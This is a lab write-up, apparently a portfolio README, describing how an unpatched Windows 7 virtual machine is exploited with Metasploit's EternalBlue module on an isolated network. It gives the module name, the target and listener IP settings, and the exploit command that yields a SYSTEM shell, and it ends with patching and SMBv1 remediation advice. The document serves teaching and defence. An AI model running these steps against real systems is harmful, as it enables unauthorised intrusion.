# MS17-010 (EternalBlue) Exploitation & Remediation Lab

## Objective
Demonstrate a practical understanding of OS vulnerabilities, network scanning, and the critical importance of patch management in Windows environments by simulating an exploit on an unpatched system.

## Tools & Environment
* **Hypervisor:** VMWARE (Isolated Internal Network)
* **Attacker OS:** Kali Linux (`192.168.216.129`)
* **Target OS:** Windows 7 SP1 Unpatched (`192.168.216.132`)
* **Key Utilities:** Nmap, Metasploit Framework, SMB Protocol

## Execution Steps

### 1. Network Discovery
Conducted a network scan using Nmap from the attacker machine (`192.168.216.129`) to identify the target IP (`192.168.216.132`) and verify that port 445 (SMB) was open.

![Escaneo con nmap](/Images/nmap.png)

### 2. Vulnerability Exploitation
Utilized the Metasploit Framework to select and configure the `ms17_010_eternalblue` exploit pointing to the target `192.168.216.132`.

#### Commands used:

```bash
msfconsole
search eternalblue
```
![opciones del exploit](/Images/eternalblue.png)

```bash
set RHOSTS 192.168.216.132
set LHOST 192.168.216.129
exploit
```

![exploit options](/Images/msfconsole-options.png)


### 3. System Access
Successfully executed the payload, gaining a remote SYSTEM shell on the target Windows machine (`192.168.216.132`) from Kali Linux (`192.168.216.129`).

![exploit](/Images/exploit.png)
![exploit](/Images/meterpreter.png)

![exploit](/Images/info.png)



## Technical Remediation (IT Support Perspective)
To prevent this vulnerability in a production environment, the following actions are required:

* Deploy Microsoft Security Bulletin MS17-010 via WSUS or standalone update installers.
* Disable SMBv1 protocol across the network using PowerShell if legacy support is not required.
* Ensure host-based firewalls block external access to port 445.